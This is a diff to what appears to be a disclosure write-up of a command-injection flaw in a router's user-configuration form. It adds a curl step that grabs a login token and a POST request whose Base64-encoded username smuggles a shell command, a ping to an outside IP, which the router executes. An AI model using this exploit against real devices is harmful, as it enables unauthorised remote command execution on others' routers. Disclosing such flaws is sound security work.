@@ -71,10 +71,14 @@ username=Jztsczsn&privilege=2&oldpass=&newpass=MTIz&confpass=MTIz&deluser=%E5%88
 ​	 this vulnerability requires the user to have permission to configure the router
 
 ##### POC&&EXP
+First, get the tokenid 
 ```
-curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDE5Mi4xNTguMzMuMDsn&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
+curl -s http://192.168.33.9/dir_login.asp  | grep tokenid
 ```
- It will decode our command Base64 and execute it 
+```
+curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=JztwaW5nIDExMi4xMjYuOTkuOTE7Jw==&oldpass=123&newpass=MTIz&confpass=MTIz&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send&tokenid=1804289383"
+```
+It will decode our command Base64 and execute it 
 
 ##### TEST
 
